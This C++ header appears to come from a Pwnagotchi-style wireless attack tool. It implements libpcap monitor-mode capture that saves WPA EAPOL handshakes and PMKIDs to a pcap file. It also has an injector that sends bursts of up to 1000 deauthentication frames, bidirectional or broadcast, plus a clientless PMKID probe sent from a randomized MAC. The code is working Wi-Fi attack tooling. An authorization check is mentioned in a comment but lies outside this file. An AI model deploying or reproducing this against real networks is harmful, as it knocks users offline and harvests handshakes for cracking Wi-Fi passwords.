#pragma once

// Native libpcap realizations of the capture + injection HAL (preferred half of the
// hybrid backend). Compiled only when ZD_WITH_LIBPCAP is defined and <pcap.h> is present.
//
//   - NativeCaptureSource: opens the monitor interface with libpcap, decodes radiotap +
//     802.11 frames via dot11.hpp, and yields full frame-level events every poll
//     (beacons, deauth/disassoc, EAPOL handshakes, PMKIDs) that airodump CSV cannot show.
//   - NativeInjector: crafts 802.11 deauthentication frames and transmits them with
//     pcap_sendpacket. The authorization gate (SecSession) is enforced before this runs.

#ifdef ZD_WITH_LIBPCAP

#include <pcap/pcap.h>

#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <deque>
#include <mutex>
#include <random>
#include <string>
#include <thread>
#include <unordered_set>
#include <vector>

#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

#include "zd/dot11.hpp"
#include "zd/secops_hal.hpp"
#include "cli_backend.hpp"
#include "dot11.hpp"
#include "../app/clock.hpp"

namespace zd {
namespace linux_backend {

inline void setPcapCloexec(pcap_t* h) {
    if (h == nullptr) {
        return;
    }
    const int fd = pcap_get_selectable_fd(h);
    if (fd >= 0) {
        const int flags = ::fcntl(fd, F_GETFD);
        if (flags >= 0) {
            (void)::fcntl(fd, F_SETFD, flags | FD_CLOEXEC);
        }
    }
}

class NativeCaptureSource final : public sec::ICaptureSource {
public:
    static constexpr std::size_t kMaxQueuedFrames = 4096u;
    static constexpr std::size_t kMaxQueuedPeers = 256u;

    NativeCaptureSource() = default;
    NativeCaptureSource(const NativeCaptureSource&) = delete;
    NativeCaptureSource& operator=(const NativeCaptureSource&) = delete;
    ~NativeCaptureSource() override { stop(); }

    void setPcapDumpPath(std::string path) { dumpPath_ = std::move(path); }

    bool start(const std::string& monitorIface) override {
        if (handle_ != nullptr) {
            return true;
        }
        char errbuf[PCAP_ERRBUF_SIZE] = {0};
        handle_ = pcap_create(monitorIface.c_str(), errbuf);
        if (handle_ == nullptr) {
            setError(errbuf);
            return false;
        }
        int cfg = 0;
        cfg |= pcap_set_snaplen(handle_, 2048);
        cfg |= pcap_set_promisc(handle_, 1);
        cfg |= pcap_set_timeout(handle_, 50);
        cfg |= pcap_set_immediate_mode(handle_, 1);
        (void)cfg;  // best-effort tuning; activation below is the authoritative check
        const int actRc = pcap_activate(handle_);
        if (actRc < 0) {
            setError(pcap_geterr(handle_));
            pcap_close(handle_);
            handle_ = nullptr;
            return false;
        }
        if (actRc > 0) {
            setError(pcap_geterr(handle_));  // non-fatal warning (e.g. promisc not supported)
        }
        setPcapCloexec(handle_);
        const int dlt = pcap_datalink(handle_);
        if (dlt != DLT_IEEE802_11_RADIO && dlt != DLT_IEEE802_11) {
            setError("interface is not in monitor mode (unexpected DLT)");
            pcap_close(handle_);
            handle_ = nullptr;
            return false;
        }
        hasRadiotap_ = (dlt == DLT_IEEE802_11_RADIO);
        openDumper();

        stopRequested_.store(false, std::memory_order_release);
        running_.store(true, std::memory_order_release);
        worker_ = std::thread([this]() { captureLoop(); });
        return true;
    }

    std::vector<sec::CapturedFrame> poll() override {
        std::deque<sec::CapturedFrame> drained;
        {
            std::lock_guard<std::mutex> lock(queueMutex_);
            drained.swap(queue_);
        }
        std::vector<sec::CapturedFrame> out;
        out.reserve(drained.size());
        for (auto& f : drained) {
            out.push_back(std::move(f));
        }
        return out;
    }

    std::vector<zd::peer::PeerSighting> pollPeers() override {
        std::vector<zd::peer::PeerSighting> out;
        std::lock_guard<std::mutex> lock(peerMutex_);
        out.reserve(peerQueue_.size());
        for (auto& p : peerQueue_) {
            out.push_back(std::move(p));
        }
        peerQueue_.clear();
        return out;
    }

    void stop() override {
        stopRequested_.store(true, std::memory_order_release);
        if (handle_ != nullptr) {
            pcap_breakloop(handle_);
        }
        if (worker_.joinable()) {
            worker_.join();
        }
        running_.store(false, std::memory_order_release);
        closeDumper();
        if (handle_ != nullptr) {
            pcap_close(handle_);
            handle_ = nullptr;
        }
        {
            std::lock_guard<std::mutex> lock(queueMutex_);
            queue_.clear();
        }
        std::lock_guard<std::mutex> plock(peerMutex_);
        peerQueue_.clear();
    }

    bool running() const override { return running_.load(std::memory_order_acquire); }
    std::string lastError() const {
        std::lock_guard<std::mutex> lock(errorMutex_);
        return lastError_;
    }

private:
    void setError(std::string err) {
        std::lock_guard<std::mutex> lock(errorMutex_);
        lastError_ = std::move(err);
    }

    void captureLoop() {
        while (!stopRequested_.load(std::memory_order_acquire)) {
            batchQueue_.clear();
            const int n = pcap_dispatch(handle_, 256, &NativeCaptureSource::trampoline,
                                        reinterpret_cast<u_char*>(this));
            if (!batchQueue_.empty()) {
                std::lock_guard<std::mutex> lock(queueMutex_);
                for (auto& f : batchQueue_) {
                    if (queue_.size() >= kMaxQueuedFrames) {
                        queue_.pop_front();
                    }
                    queue_.push_back(std::move(f));
                }
                batchQueue_.clear();
            }
            if (!peerBatch_.empty()) {
                std::lock_guard<std::mutex> lock(peerMutex_);
                for (auto& p : peerBatch_) {
                    if (peerQueue_.size() >= kMaxQueuedPeers) {
                        peerQueue_.pop_front();
                    }
                    peerQueue_.push_back(std::move(p));
                }
                peerBatch_.clear();
            }
            if (n == PCAP_ERROR_BREAK || stopRequested_.load(std::memory_order_acquire)) {
                break;
            }
            if (n < 0) {
                setError(pcap_geterr(handle_));
                break;
            }
        }
        running_.store(false, std::memory_order_release);
    }

    void openDumper() {
        closeDumper();
        dumpedBeaconBssids_.clear();
        dumpedBeaconOrder_.clear();
        lastDumpFlushMs_ = 0u;
        if (dumpPath_.empty() || handle_ == nullptr) {
            return;
        }
        const int fd = openSecureWriteRegular(dumpPath_, /*append=*/false);
        if (fd < 0) {
            setError("failed to securely open PCAP dump path: " + dumpPath_);
            return;
        }
        FILE* fp = ::fdopen(fd, "wb");
        if (fp == nullptr) {
            // POSIX fdopen() leaves fd open on failure; cppcheck 2.13 posix.cfg mismodels it as consumed.
            // cppcheck-suppress doubleFree
            ::close(fd);
            setError("fdopen failed for PCAP dump path");
            return;
        }
        dumper_ = pcap_dump_fopen(handle_, fp);
        if (dumper_ == nullptr) {
            setError(pcap_geterr(handle_));
            ::fclose(fp);
        }
    }

    void closeDumper() {
        if (dumper_ != nullptr) {
            pcap_dump_flush(dumper_);
            pcap_dump_close(dumper_);
            dumper_ = nullptr;
        }
    }

    static void trampoline(u_char* user, const struct pcap_pkthdr* h, const u_char* bytes) {
        auto* self = reinterpret_cast<NativeCaptureSource*>(user);
        const uint32_t now = linux_app::nowMs();
        std::optional<sec::CapturedFrame> f;
        if (self->hasRadiotap_) {
            f = decodeRadiotapFrame(bytes, h->caplen, now);
        } else {
            f = decodeDot11(bytes, h->caplen, now, -100);
        }
        // Passive peer discovery: greet other ZeroDay units and classic Pwnagotchi /
        // Palnagotchi beacons on the raw 802.11 frame (after any radiotap header).
        {
            const u_char* mac = bytes;
            uint32_t macLen = h->caplen;
            if (self->hasRadiotap_ && h->caplen >= 4u) {
                const uint32_t rtLen =
                    static_cast<uint32_t>(bytes[2]) | (static_cast<uint32_t>(bytes[3]) << 8u);
                if (rtLen < h->caplen) {
                    mac = bytes + rtLen;
                    macLen = h->caplen - rtLen;
                } else {
                    macLen = 0u;
                }
            }
            if (macLen >= 24u) {
                if (const auto hit = zd::peer::classifyWifiPeer(mac, macLen)) {
                    self->peerBatch_.push_back(
                        zd::peer::PeerSighting{*hit, f.has_value() ? f->rssi : -100, now});
                }
            }
        }
        if (f.has_value()) {
            if (self->dumper_ != nullptr) {
                if (f->kind == sec::FrameKind::Eapol || f->kind == sec::FrameKind::Pmkid) {
                    pcap_dump(reinterpret_cast<u_char*>(self->dumper_), h, bytes);
                    pcap_dump_flush(self->dumper_);
                    self->lastDumpFlushMs_ = now;
                } else if (f->kind == sec::FrameKind::Beacon && !f->bssid.empty()) {
                    if (self->dumpedBeaconBssids_.find(f->bssid) == self->dumpedBeaconBssids_.end()) {
                        while (self->dumpedBeaconBssids_.size() >= 1024u &&
                               !self->dumpedBeaconOrder_.empty()) {
                            self->dumpedBeaconBssids_.erase(self->dumpedBeaconOrder_.front());
                            self->dumpedBeaconOrder_.pop_front();
                        }
                        self->dumpedBeaconBssids_.insert(f->bssid);
                        self->dumpedBeaconOrder_.push_back(f->bssid);
                        pcap_dump(reinterpret_cast<u_char*>(self->dumper_), h, bytes);
                        if (self->lastDumpFlushMs_ == 0u ||
                            (now - self->lastDumpFlushMs_) >= 5000u) {
                            pcap_dump_flush(self->dumper_);
                            self->lastDumpFlushMs_ = now;
                        }
                    }
                }
            }
            self->batchQueue_.push_back(std::move(*f));
        }
    }

    pcap_t* handle_ = nullptr;
    pcap_dumper_t* dumper_ = nullptr;
    bool hasRadiotap_ = true;
    std::atomic<bool> running_{false};
    std::atomic<bool> stopRequested_{false};
    std::thread worker_;
    std::mutex queueMutex_;
    mutable std::mutex errorMutex_;
    std::deque<sec::CapturedFrame> queue_;
    std::vector<sec::CapturedFrame> batchQueue_;
    std::mutex peerMutex_;
    std::deque<zd::peer::PeerSighting> peerQueue_;
    std::vector<zd::peer::PeerSighting> peerBatch_;
    std::unordered_set<std::string> dumpedBeaconBssids_;
    std::deque<std::string> dumpedBeaconOrder_;
    uint32_t lastDumpFlushMs_ = 0u;
    std::string dumpPath_;
    std::string lastError_;
};

class NativeInjector final : public sec::IInjector {
public:
    explicit NativeInjector(sec::IMonitorControl* monitor) : monitor_(monitor) {}
    NativeInjector(const NativeInjector&) = delete;
    NativeInjector& operator=(const NativeInjector&) = delete;
    ~NativeInjector() override { closeHandle(); }

    bool available() const override {
        return monitor_ != nullptr && monitor_->isMonitor();
    }

    sec::InjectResult deauth(const std::string& bssid, const std::string& client,
                             uint32_t count) override {
        sec::InjectResult res;
        res.decision = sec::AuthDecision::Allowed;  // gate already cleared by SecSession
        if (!ensureHandle()) {
            res.transmitted = false;
            res.detail = "pcap open failed: " + lastError_;
            return res;
        }
        uint8_t ap[6], sta[6];
        if (!zd::dot11::parseMac(bssid.c_str(), ap) || sec::isMulticastMac(bssid)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        if (!sec::isValidClientTarget(client)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }
        const bool broadcast = client.empty() || sec::isBroadcastMac(sec::normalizeMac(client));
        if (broadcast) {
            std::memset(sta, 0xFF, 6);
        } else if (!zd::dot11::parseMac(client.c_str(), sta)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }

        const uint32_t safeCount = (count < 1u) ? 1u : ((count > kMaxBurst) ? kMaxBurst : count);
        int sent = 0;
        for (uint32_t i = 0; i < safeCount; ++i) {
            // AP -> client (or broadcast)
            if (sendDeauth(sta, ap, ap)) {
                ++sent;
            }
            // client -> AP (targeted only), as aireplay does, to hit both directions.
            if (!broadcast && sendDeauth(ap, sta, ap)) {
                ++sent;
            }
        }
        if (sent == 0) {
            // Drop potentially stale handle so a subsequent call reopens cleanly.
            closeHandle();
        }
        res.transmitted = sent > 0;
        res.detail = "pcap_sendpacket deauth x" + std::to_string(sent);
        return res;
    }

    // Clientless PMKID probe: send auth->assoc from a throwaway locally-administered STA MAC
    // to solicit the AP's EAPOL M1 (and any RSN PMKID). The reply is captured by the running
    // monitor sniffer and correlated by SecSession::collectPmkid(). Complements deauth; a
    // WPA3-SAE/PMF target yields no PMKID, so the deauth path stays the fallback there.
    sec::InjectResult pmkidProbe(const std::string& bssid, const std::string& ssid,
                                 uint32_t count) override {
        sec::InjectResult res;
        res.decision = sec::AuthDecision::Allowed;  // gate already cleared by SecSession
        if (!ensureHandle()) {
            res.transmitted = false;
            res.detail = "pcap open failed: " + lastError_;
            return res;
        }
        uint8_t ap[6];
        if (!zd::dot11::parseMac(bssid.c_str(), ap) || sec::isMulticastMac(bssid)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        uint8_t sta[6];
        zd::dot11::randomStaMac(sta, static_cast<uint32_t>(std::random_device{}()));

        const uint32_t safeCount = (count < 1u) ? 1u : ((count > kMaxBurst) ? kMaxBurst : count);
        int sent = 0;
        for (uint32_t i = 0; i < safeCount; ++i) {
            if (sendAuth(ap, sta)) {
                ++sent;
            }
            if (sendAssoc(ap, sta, ssid)) {
                ++sent;
            }
        }
        if (sent == 0) {
            closeHandle();
        }
        res.transmitted = sent > 0;
        res.detail = "pcap_sendpacket auth+assoc x" + std::to_string(sent);
        return res;
    }

private:
    static constexpr uint32_t kMaxBurst = 1000u;

    bool ensureHandle() {
        if (monitor_ == nullptr || !monitor_->isMonitor()) {
            closeHandle();
            lastError_ = "no monitor interface";
            return false;
        }
        const std::string curIface = monitor_->monitorIface();
        if (handle_ != nullptr) {
            if (openedIface_ == curIface) {
                return true;
            }
            closeHandle();
        }
        char errbuf[PCAP_ERRBUF_SIZE] = {0};
        handle_ = pcap_open_live(curIface.c_str(), 800, 0, 100, errbuf);
        if (handle_ == nullptr) {
            lastError_ = errbuf;
            return false;
        }
        setPcapCloexec(handle_);
        openedIface_ = curIface;
        return true;
    }

    void closeHandle() {
        if (handle_ != nullptr) {
            pcap_close(handle_);
            handle_ = nullptr;
        }
        openedIface_.clear();
    }

    // Build + send one 802.11 deauth reusing the portable core frame builder.
    bool sendDeauth(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid) {
        uint8_t frame[8u + zd::dot11::kMgmtDeauthFrameLen];
        // Minimal radiotap header (version 0, length 8, no fields).
        const uint8_t rt[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};
        std::memcpy(frame, rt, sizeof(rt));
        const std::size_t bodyLen = zd::dot11::buildDeauthFrame(frame + sizeof(rt), dst, src, bssid);
        return pcap_sendpacket(handle_, frame, static_cast<int>(sizeof(rt) + bodyLen)) == 0;
    }

    // Radiotap stub prepended to raw 802.11 management frames for pcap injection.
    static constexpr uint8_t kRadiotap[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};

    bool sendAuth(const uint8_t* ap, const uint8_t* sta) {
        uint8_t frame[8u + zd::dot11::kAuthFrameLen];
        std::memcpy(frame, kRadiotap, sizeof(kRadiotap));
        const std::size_t n = zd::dot11::buildAuthFrame(frame + sizeof(kRadiotap), ap, sta);
        return pcap_sendpacket(handle_, frame, static_cast<int>(sizeof(kRadiotap) + n)) == 0;
    }

    bool sendAssoc(const uint8_t* ap, const uint8_t* sta, const std::string& ssid) {
        uint8_t frame[8u + zd::dot11::kMaxAssocReqLen];
        std::memcpy(frame, kRadiotap, sizeof(kRadiotap));
        const std::size_t n = zd::dot11::buildAssocRequest(frame + sizeof(kRadiotap), ap, sta,
                                                           ssid.data(), ssid.size());
        return pcap_sendpacket(handle_, frame, static_cast<int>(sizeof(kRadiotap) + n)) == 0;
    }

    sec::IMonitorControl* monitor_;
    pcap_t* handle_ = nullptr;
    std::string openedIface_;
    std::string lastError_;
};

}  // namespace linux_backend
}  // namespace zd

#endif  // ZD_WITH_LIBPCAP
